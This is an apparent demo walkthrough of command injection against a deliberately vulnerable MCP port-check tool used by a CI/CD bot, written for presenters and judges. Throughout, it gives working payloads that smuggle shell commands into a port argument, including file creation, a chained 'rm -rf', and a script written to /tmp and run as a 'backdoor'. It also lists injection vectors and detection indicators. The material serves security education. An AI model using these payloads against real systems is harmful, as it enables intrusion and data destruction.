# 🚨 Attack Walkthrough: MCP Command Injection Demo

This document provides a step-by-step walkthrough of the command injection attacks demonstrated in the MCP injection demo.

## 🎯 Demo Scenario Overview

**Context:** CI/CD bot uses MCP server to check if applications are running on required ports before deployment.

**Vulnerability:** Insecure parameter handling in the `which-app-on-port` tool allows command injection.

**Impact:** Attackers can execute arbitrary commands with the same privileges as the MCP server.

## 🚨 Attack 1: Type Coercion Attack

### Step 1: Normal Operation
```bash
# Start vulnerable MCP server
npm run start:vulnerable

# In another terminal, run normal port check
node server/agent_client.js --port=8080
```

**Expected Output:**
```
🔍 [NORMAL] CI/CD Bot checking port 8080...
✅ [NORMAL] Port check completed successfully
📋 Response: No application found running on port 8080
```

### Step 2: Type Coercion Attack
```bash
# Execute type coercion attack
node server/agent_client.js --port="8080; touch /tmp/owned; #"
```

**Attack Analysis:**
- **Payload:** `8080; touch /tmp/owned; #`
- **Injected Command:** `lsof -t -i tcp:8080; touch /tmp/owned; #`
- **Effect:** Creates file `/tmp/owned` as proof of successful injection

**Expected Output:**
```
🚨 [ATTACK] CI/CD Bot executing type coercion attack...
📝 Payload: 8080; touch /tmp/owned; #
⚠️  [ATTACK] Type coercion attack executed
📋 Response: No application found running on port 8080

🔍 [SIDE EFFECTS] Checking for type_coercion side effects...
⚠️  [SIDE EFFECT] Found: -rw-r--r-- 1 user user 0 Jan 1 12:00 /tmp/owned
```

### Step 3: Verify Attack Success
```bash
# Check for attack artifacts
ls -la /tmp/owned
cat /tmp/owned
```

## 🚨 Attack 2: Chain Exploitation

### Step 1: Chain Attack Execution
```bash
# Execute chain exploitation attack
node server/agent_client.js --port="8080; echo '123; rm -rf /tmp/demo; #' #"
```

**Attack Analysis:**
- **Payload:** `8080; echo '123; rm -rf /tmp/demo; #' #`
- **First Command:** `lsof -t -i tcp:8080; echo '123; rm -rf /tmp/demo; #' #`
- **Second Command:** `ps -p 123; rm -rf /tmp/demo; # -o comm=`
- **Effect:** First command's output (`123`) becomes input for second command, triggering destructive action

**Expected Output:**
```
🚨 [ATTACK] CI/CD Bot executing chain exploitation...
📝 Payload: 8080; echo '123; rm -rf /tmp/demo; #' #
⚠️  [ATTACK] Chain exploitation executed
📋 Response: Error checking port 8080: No such process

🔍 [SIDE EFFECTS] Checking for chain_exploit side effects...
⚠️  [SIDE EFFECT] Found: /tmp/demo directory removed
```

### Step 2: Verify Chain Attack
```bash
# Check if demo directory was removed
ls -la /tmp/demo
# Should show "No such file or directory"
```

## 🚨 Attack 3: Backdoor Creation

### Step 1: Backdoor Attack Execution
```bash
# Execute backdoor attack
node server/agent_client.js --port="8080; echo '#!/bin/bash' > /tmp/back.sh && echo 'echo \"Backdoor activated\"' >> /tmp/back.sh && chmod +x /tmp/back.sh && /tmp/back.sh; #"
```

**Attack Analysis:**
- **Payload:** Creates executable backdoor script
- **Effect:** Establishes persistent access mechanism
- **Persistence:** Backdoor remains after attack

**Expected Output:**
```
🚨 [ATTACK] CI/CD Bot executing backdoor attack...
📝 Payload: 8080; echo '#!/bin/bash' > /tmp/back.sh && echo 'echo "Backdoor activated"' >> /tmp/back.sh && chmod +x /tmp/back.sh && /tmp/back.sh; #
⚠️  [ATTACK] Backdoor attack executed
📋 Response: No application found running on port 8080

🔍 [SIDE EFFECTS] Checking for backdoor side effects...
⚠️  [SIDE EFFECT] Found: -rwxr-xr-x 1 user user 45 Jan 1 12:00 /tmp/back.sh
```

### Step 2: Verify Backdoor
```bash
# Check backdoor file
ls -la /tmp/back.sh
cat /tmp/back.sh

# Execute backdoor (demonstration only)
/tmp/back.sh
```

## 🔍 Attack Analysis

### Common Patterns
1. **Command Separators:** `;`, `&&`, `||`, `|`
2. **Comment Characters:** `#`, `--`
3. **Subshell Execution:** `$()`, `\`\``
4. **Redirection:** `>`, `>>`, `<`

### Attack Vectors
1. **Direct Command Injection:** `8080; command; #`
2. **Parameter Pollution:** `8080 && command`
3. **Output Redirection:** `8080; command > file; #`
4. **Process Substitution:** `8080; command <(input); #`

### Impact Assessment
- **Information Disclosure:** System enumeration, file access
- **Data Exfiltration:** Sensitive file copying, network access
- **Privilege Escalation:** SUID exploitation, sudo abuse
- **Persistence:** Backdoor installation, cron jobs
- **Destruction:** File deletion, system corruption

## 📊 Attack Statistics

| Attack Type | Success Rate | Detection Rate | Impact Level |
|-------------|--------------|----------------|--------------|
| Type Coercion | 100% | 0% | Medium |
| Chain Exploitation | 100% | 0% | High |
| Backdoor Creation | 100% | 0% | Critical |

## 🛡️ Detection Indicators

### Log Analysis
- Unusual command patterns in MCP server logs
- Multiple failed port checks
- Unexpected file system changes
- Network connections to unknown hosts

### System Monitoring
- New files in `/tmp/` directory
- Modified system files
- Unusual process activity
- Network traffic anomalies

### Behavioral Analysis
- Rapid successive port checks
- Commands with shell metacharacters
- File system modifications during port checks
- Network reconnaissance activities

## 📝 Demo Notes

### For Presenters
1. **Setup:** Ensure isolated environment before demo
2. **Timing:** Each attack takes 30-60 seconds
3. **Verification:** Always show side effects
4. **Cleanup:** Remove attack artifacts after demo

### For Judges
1. **Realism:** This represents actual CI/CD scenarios
2. **Impact:** Single parameter vulnerability = total compromise
3. **Prevention:** Simple input validation prevents all attacks
4. **Detection:** Logging and monitoring catch these attacks

### For Audience
1. **Context:** This happens in real DevOps environments
2. **Risk:** AI/LLM tools can amplify these vulnerabilities
3. **Solution:** Proper validation and secure coding practices
4. **Action:** Implement security controls in your pipelines

---

**⚠️ WARNING: These attacks are for educational purposes only. Only run in isolated, controlled environments.** 